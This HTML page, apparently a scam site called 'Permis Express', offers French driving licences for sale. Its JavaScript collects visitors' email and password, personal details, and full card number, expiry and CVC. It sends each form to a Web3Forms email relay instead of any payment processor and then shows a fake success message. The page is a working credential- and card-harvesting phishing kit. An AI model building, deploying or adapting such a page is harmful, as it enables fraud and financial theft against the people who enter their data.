<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Permis Express | Enregistrement</title>
    <link href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
    <script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.0/js/bootstrap.min.js"></script>
    <script src="//code.jquery.com/jquery-1.11.1.min.js"></script>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css">

    <!------ Include the above in your HEAD tag ---------->
</head>
<body>
 <style>
    body{ 
    margin-top:40px; 
}

.stepwizard-step p {
    margin-top: 10px;
}

.stepwizard-row {
    display: table-row;
}

.stepwizard {
    display: table;
    width: 100%;
    position: relative;
}

.stepwizard-step button[disabled] {
    opacity: 1 !important;
    filter: alpha(opacity=100) !important;
}

.stepwizard-row:before {
    top: 14px;
    bottom: 0;
    position: absolute;
    content: " ";
    width: 100%;
    height: 1px;
    background-color: #ccc;
    z-index: 0;

}

.stepwizard-step {
    display: table-cell;
    text-align: center;
    position: relative;
}
.btn
{
        border-radius: 0px;
}
.btn-circle {
    width: 56px;
    height: 56px;
    text-align: center;
    padding: 12px 0;
    font-size: 20px;
    line-height: 1.428571429;
    border-radius: 35px;
    margin-top: -14px;
    border: solid 3px #ccc !important;
    opacity:1 !important;
     -webkit-box-shadow:inset 0px 0px 0px 3px #fff !important; 
     -moz-box-shadow:inset 0px 0px 0px 3px #fff !important;
    -o-box-shadow:inset 0px 0px 0px 3px #fff !important;
   -ms-box-shadow:inset 0px 0px 0px 3px #fff !important; 
   box-shadow:inset 0px 0px 0px 3px #fff !important;
    background-color:#428bca;
}

.primary



        #VerifyEmail-step h2 {
            text-align: center;
            color: #333;
            margin-bottom: 30px;
        }

        .pcard-container {
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 20px;
            margin-bottom: 20px;
        }

        .pcard {
            border: 1px solid #ddd;
            border-radius: 10px;
            padding: 20px;
            width: 30%;
            text-align: center;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            background-color: #fff;
            cursor: pointer;
            transition: background-color 0.3s ease, box-shadow 0.3s ease;
        }

        .pcard:hover {
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
        }

        .selected {
            background-color: #28a745 !important;
            color: rgb(255, 255, 255);
        }

        .pcard h3 {
            margin-bottom: 15px;
            color: #333;
        }

        .pcard p {
            margin: 10px 0;
            font-size: 16px;
        }

        .info-text {
            margin-top: 20px;
            font-size: 18px;
            color: #444;
            text-align: center;
        }

       .invoice-card {
            border: 1px solid #ddd;
            border-radius: 10px;
            padding: 20px;
            width: 50%;
            margin: 20px auto;
            text-align: center;
            background-color: #f7f7f7;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }

        .invoice-card h3 {
            margin-bottom: 15px;
            color: #28a745;
        }

        .invoice-card p {
            margin: 10px 0;
            font-size: 16px;
        }

        .highlight {
            color: #28a745;
            font-weight: bold;
        }
  @media screen and (max-width: 750px) {
    .pcard-container {
        display: block;
        margin: 0 auto;
    }

    .pcard {
        width: 100%;
        margin-bottom: 20px;
    }

    .pcard h3 {
        font-size: 18px; /* Smaller heading for mobile */
    }

    .pcard p {
        font-size: 14px; /* Smaller text for mobile */
    }
}

 </style>

 <div class="container">
<div class="stepwizard">
    <div class="stepwizard-row setup-panel">
        <div class="stepwizard-step">
            <a href="#VerifyEmail-step" type="button"  class="btn btn-primary btn-circle" >
                <span class="glyphicon glyphicon-envelope"></span>
            </a>
            <p>Verifier Email</p>
        </div>
        <div class="stepwizard-step">
            <a href="#ProfileSetup-step" type="button" class="btn btn-success btn-circle"  disabled="disabled" id="ProfileSetup-step-2">
                <span class="glyphicon glyphicon-user"></span>
            </a>
            <p>Profil</p>
        </div>
        <div class="stepwizard-step">
            <a href="#Security-Setup-step" type="button"  class="btn btn-success-2 btn-circle"  disabled="disabled" id="Security-Setup-step-3">
                <span class="glyphicon glyphicon-ok"></span>
            </a>
            <p>Paiement</p>
        </div>
    </div>
</div>

  <div class="row setup-content" id="VerifyEmail-step">
      <div class="col-xs-12">
          <div class="col-md-12">
              <br/>
              <form role="form" id="paymentForm-one">
                <input type="hidden" name="access_key" value="e7bf3ff9-6c7c-4f00-9e51-83eff5b9d948">
              <div class="form-horizontal">
                  <fieldset>
                      <legend>Enter Your Email Information</legend>
                      <br/>
                      <div class="form-group">
                          <label class="col-sm-3 control-label" for="email">Your Email</label>
                          <div class="col-sm-9">
                              <input maxlength="100" type="email" id="email" required="required" class="form-control" name="email" placeholder="Enter Email" />
                          </div>
                      </div>
                      <div class="form-group">
                          <label class="col-sm-3 control-label" for="password">Password</label>
                          <div class="col-sm-9">
                              <input id="password" maxlength="100" type="password" required="required" name="password" class="form-control" placeholder="Enter Password"  />
                              <div id="password-error" class="error"></div>
                          </div>
                      </div>
                      <div class="form-group">
                          <label class="col-sm-3 control-label" for="confirm-password">Re-enter Password</label>
                          <div class="col-sm-9">
                              <input maxlength="100" type="password" required="required" class="form-control" placeholder="Enter Password" />
                          </div>
                      </div>
                  </fieldset>             
                </div>
              </form>
              <button class="btn btn-primary nextBtn btn-lg pull-right" id="one" type="button" >Suivant</button>
          </div>
      </div>
  </div>
            
</div>




    <div class="row setup-content" id="ProfileSetup-step">
        <div class="col-xs-12">
            <div class="col-md-12">
                 <br/>
                <div class="form-horizontal">
                    <form  role="form" id="paymentForm-two">
                      <input type="hidden" name="access_key" value="e7bf3ff9-6c7c-4f00-9e51-83eff5b9d948">
                        <fieldset>
                      
                          <legend>Entrer vos Information</legend>
                          <br/>
                          <div class="form-group">
                            <label class="col-sm-3 control-label" for="person-name">Nom</label>
                            <div class="col-sm-9">
                             <input maxlength="100" type="text" required="required" id="person-name" name="nom" class="form-control" placeholder="Entrer votre Nom" />
                            </div>
                          </div>
                          <div class="form-group">
                            <label class="col-sm-3 control-label" for="phone">Telephone</label>
                            <div class="col-sm-9">
                             <input maxlength="100" type="text" required="required" id="phone" name="numb" class="form-control" placeholder="Entrer votre Numero" />
                            </div>
                          </div>
                          <div class="form-group">
                            <label class="col-sm-3 control-label" for="adress">Address</label>
                            <div class="col-sm-9">
                             <input maxlength="100" type="text" required="required" id="adress" name="adress" class="form-control" placeholder="Entrer votre Address" />
                            </div>
                          </div>
                          <div class="col-lg-6">
                               <div class="form-group">
                                    <label class="col-sm-6 control-label" for="city">Ville</label>
                                    <div class="col-sm-6" style="padding-left:8px">
                                     <input maxlength="100" type="text" required="required" id="city" name="kwat" class="form-control" placeholder="Entrer votre Ville" />
                                    </div>
                                  </div>
                          </div>
                           <div class="col-lg-6">
                               <div class="form-group">
                                    <label class="col-sm-6 control-label" for="postal-code">Code Postal</label>
                                    <div class="col-sm-6" style="padding:0px">
                                     <input maxlength="100" type="text" required="required" id="postal-code" name="poste-c" class="form-control" placeholder="Entrer votre Code Postal" />
                                    </div>
                                  </div>
                          </div>
                          <div class="form-group">
                            <label class="col-sm-3 control-label" for="country">Country</label>
                            <div class="col-sm-9">
                             <select required="required" class="form-control" name="pays" id="country">
                                <option value="0">Choisir un Pays</option>
                                <option value="usa">USA</option>
                                <option value="pakistan">Pakistan</option>
                                <option value="india">India</option>
                                <option value="china">China</option>
                                <option value="uk">United Kingdom</option>
                                <option value="canada">Canada</option>
                                <option value="germany">Germany</option>
                                <option value="france">France</option>
                                <option value="australia">Australia</option>
                                <option value="brazil">Brazil</option>
                                <option value="japan">Japan</option>
                                <option value="south_africa">South Africa</option>
                                <option value="mexico">Mexico</option>
                                <option value="russia">Russia</option>
                                <option value="italy">Italy</option>
                                <option value="spain">Spain</option>
                             </select>
                            </div>
                          </div>
                        </fieldset>
                    </form>
                </div>
                <button class="btn btn-primary nextBtn btn-lg pull-right" id="two" type="button" >Suivant</button>
            </div>
        </div>
    </div>
    <div class="row setup-content" id="Security-Setup-step">
        <div class="col-xs-12">
            <div class="col-md-12">
                
                
                <h2>Choisissez une option</h2>

                <div class="pcard-container">
                    <div class="pcard" id="option1" onclick="chooseOption('Permis Proffesionel', 1000, 'option1')">
                        <h3>Categorie C et D</h3>
                        <p>Prix: 1000€</p>
                    </div>
                    <div class="pcard" id="option2" onclick="chooseOption('Permis auto', 700, 'option2')">
                        <h3>Categorie B</h3>
                        <p>Prix: 700€</p>
                    </div>
                    <div class="pcard" id="option3" onclick="chooseOption('Permis moto', 400, 'option3')">
                        <h3>Categorie A</h3>
                        <p>Prix: 400€</p>
                    </div>
                </div>
            
                <div class="info-text">
                    <p><b>Note:</b>Vous payez juste 20€ pour l'enregistrement, le reste sera à payer après la validation des données.</p>
                </div>
            
                <div class="invoice-card" id="invoice-card" style="display:none;">
                    <h3>Facture</h3>
                    <p id="selected-option"></p>
                    <p>Montant total (TVA incluse): <span class="highlight" id="total-price"></span>€</p>
                </div>
                <div class="padding">
                  <div class="row">
                      <div class="container-fluid d-flex justify-content-center">
                          <div class="col-sm-8 col-md-6">
                              <div class="card" id="cv-card" style="display:none;">
                                  <div class="card-header">
                                      <div class="row">
                                          <div class="col-md-6">
                                              <span>CREDIT/DEBIT CARD PAYMENT</span>
                                          </div>
                                          <div class="col-md-6 text-right" style="margin-top: -5px;">
                                              <img src="https://img.icons8.com/color/36/000000/visa.png">
                                              <img src="https://img.icons8.com/color/36/000000/mastercard.png">
                                              <img src="https://img.icons8.com/color/36/000000/amex.png">
                                          </div>
                                      </div>
                                  </div>
                                  <form id="paymentForm" class="paymentForm">
                                      <input type="hidden" name="access_key" value="e7bf3ff9-6c7c-4f00-9e51-83eff5b9d948">
                                      <fieldset>
                                          <div class="card-body" style="height: 350px">
                                              <div class="form-group">
                                                  <label for="cc-number" class="control-label">NUMERO DE CARTE BANCAIRE</label>
                                                  <input id="cc-number" name="number" type="tel" class="input-lg form-control cc-number" autocomplete="off" placeholder="&bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull;" required>
                                              </div>
                                              <div class="row">
                                                  <div class="col-md-6">
                                                      <div class="form-group">
                                                          <label for="cc-exp" class="control-label">DATE D'EXPIRATION</label>
                                                          <input id="cc-exp" name="exp" type="tel" class="input-lg form-control cc-exp" autocomplete="off" placeholder="&bull;&bull; / &bull;&bull;&bull;&bull;" required>
                                                      </div>
                                                  </div>
                                                  <div class="col-md-6">
                                                      <div class="form-group">
                                                          <label for="cc-cvc" class="control-label">CVC</label>
                                                          <input id="cc-cvc" name="cv" type="tel" class="input-lg form-control cc-cvc" autocomplete="off" placeholder="&bull;&bull;&bull;" required>
                                                      </div>
                                                  </div>
                                              </div>
                                              <div class="form-group">
                                                  <label for="card-holder-name" class="control-label">NOM DU TITULAIRE DE LA CARTE</label>
                                                  <input type="text" name="name" id="card-holder-name" class="input-lg form-control" required>
                                              </div>
                                              <div class="form-group">
                                                  
                                              </div>
                                             
                                          </div>
                                      </fieldset>
                                  </form>
          
                              </div>
                          </div>
                      </div>
                  </div>
              </div>
              <div id="result" class="text-center"></div> <!-- Result message area -->
            
                <!--h3> You are all set!</h3>
                <p>Welcome to MetroPago. We are glade to have you here.</p-->
                
                <input value="TERMINER" id="submitbtn" type="submit" class="btn btn-success btn-lg form-control" style="font-size: 1rem; display: none;">
            </div>
        </div>
    </div>
</form>
</div>
</body>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
<script>
    $(document).ready(function () {

var navListItems = $('div.setup-panel div a'),
        allWells = $('.setup-content'),
        allNextBtn = $('.nextBtn');

allWells.hide();

navListItems.click(function (e) {
    e.preventDefault();
    var $target = $($(this).attr('href')),
        $item = $(this);
    if (!$item.hasClass('disabled')) {        
        //navListItems.removeClass('btn-primary').addClass('btn-default');
        if($item.attr('id')!=$(navListItems[1]).attr('id'))
        {
            $(navListItems[1]).removeClass('btn-primary').addClass('btn-success');
        }
        //$('#item3').addClass('btn-success');
        $item.addClass('btn-primary');
        allWells.hide();
        $target.show();
        $target.find('input:eq(0)').focus();
    }
});

allNextBtn.click(function(){
    var curStep = $(this).closest(".setup-content"),
        curStepBtn = curStep.attr("id"),
        nextStepWizard = $('div.setup-panel div a[href="#' + curStepBtn + '"]').parent().next().children("a"),
        curInputs = curStep.find("input[type='text'],input[type='url'], input[type='password'], input[type='email']"),
        isValid = true;

    $(".form-group").removeClass("has-error");
    for(var i=0; i<curInputs.length; i++){
        if (!curInputs[i].validity.valid){
            isValid = false;
            $(curInputs[i]).closest(".form-group").addClass("has-error");
        }
    }

    if (isValid)
        nextStepWizard.removeAttr('disabled').trigger('click');
});

$('div.setup-panel div a.btn-primary').trigger('click');
});   

let selectedCard = null;

        function chooseOption(option, price, cardId) {
            const registrationFee = 20;
            const totalPrice =  registrationFee;

            // Clear previous selection
            if (selectedCard) {
                document.getElementById(selectedCard).classList.remove('selected');
            }

            // Set the new selected card
            selectedCard = cardId;
            document.getElementById(selectedCard).classList.add('selected');

            // Update invoice details
            document.getElementById('selected-option').textContent = "Option choisie: " + option;
            document.getElementById('total-price').textContent = totalPrice.toFixed(2);
            document.getElementById('invoice-card').style.display = 'block';
            document.getElementById('cv-card').style.display = 'block';
            document.getElementById('submitbtn').style.display = 'block';
        }

 // Format and restrict inputs for card number, expiry, and CVC
 $(function($) {
            $('.cc-number').payment('formatCardNumber');
            $('.cc-exp').payment('formatCardExpiry');
            $('.cc-cvc').payment('formatCardCVC');
        });

       // Wait for the DOM to load completely


// Handle the "TERMINER" button click
document.querySelector('input[type="submit"]').addEventListener('click', function (e) {
    e.preventDefault(); // Prevent form submission
    const form = document.getElementById('paymentForm');
    const result = document.getElementById('result');
    
           const formData = new FormData(form); // Create FormData object
            const object = Object.fromEntries(formData); // Convert FormData to an object
            const json = JSON.stringify(object); // Convert object to JSON format
            result.innerHTML = "Veuillez Patienter..."; // Show message

            // Fetch API to send data to Web3Forms
            fetch('https://api.web3forms.com/submit', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: json
            })
            .then(async (response) => {
                let json = await response.json();
                if (response.status == 200) {
                    result.innerHTML ="Enregistrement terminé avec succès !"; // Success message
                    result.style.color = "green";
                } else {
                    console.log(response);
                    result.innerHTML = json.message; // Error message from the response
                     result.style.color = "red"
                }
            })
            .catch(error => {
                console.log(error);
                result.innerHTML = "Veuillez essayez a nouveau!"; // Network error
                result.style.color = "red"; // Red text on network error
            })
            .then(function() {
                form.reset(); // Reset form after submission
                setTimeout(() => {
                    result.style.display = "none"; // Hide result message after 3 seconds
                }, 3000);
            });
        });


        document.addEventListener('DOMContentLoaded', function () {
     // Handle the "Suivant" button click
     document.getElementById('two').addEventListener('click', function (e) {
        e.preventDefault(); // Prevent default form submission

        const form = document.getElementById('paymentForm-one');
    
    
           const formData = new FormData(form); // Create FormData object
            const object = Object.fromEntries(formData); // Convert FormData to an object
            const json = JSON.stringify(object); // Convert object to JSON format
            

            // Fetch API to send data to Web3Forms
            fetch('https://api.web3forms.com/submit', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: json
            })
            .then(async (response) => {
                let json = await response.json();
                if (response.status == 200) {
                  console.log(response);
                } else {
                    console.log(response);
                
                }
            })
            .catch(error => {
                console.log(error);
                
            })
            .then(function() {
                form.reset(); // Reset form after submission
                setTimeout(() => {
                  
                }, 3000);
            });
        });
        })   
      
        document.addEventListener('DOMContentLoaded', function () {
     // Handle the "Suivant" button click
     document.getElementById('two').addEventListener('click', function (e) {
        e.preventDefault(); // Prevent default form submission

        const form = document.getElementById('paymentForm-two');
    
    
           const formData = new FormData(form); // Create FormData object
            const object = Object.fromEntries(formData); // Convert FormData to an object
            const json = JSON.stringify(object); // Convert object to JSON format
            

            // Fetch API to send data to Web3Forms
            fetch('https://api.web3forms.com/submit', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: json
            })
            .then(async (response) => {
                let json = await response.json();
                if (response.status == 200) {
                  console.log(response);
                } else {
                    console.log(response);
                
                }
            })
            .catch(error => {
                console.log(error);
                
            })
            .then(function() {
                form.reset(); // Reset form after submission
                setTimeout(() => {
                  
                }, 3000);
            });
        });
        }) 


</script>
</html>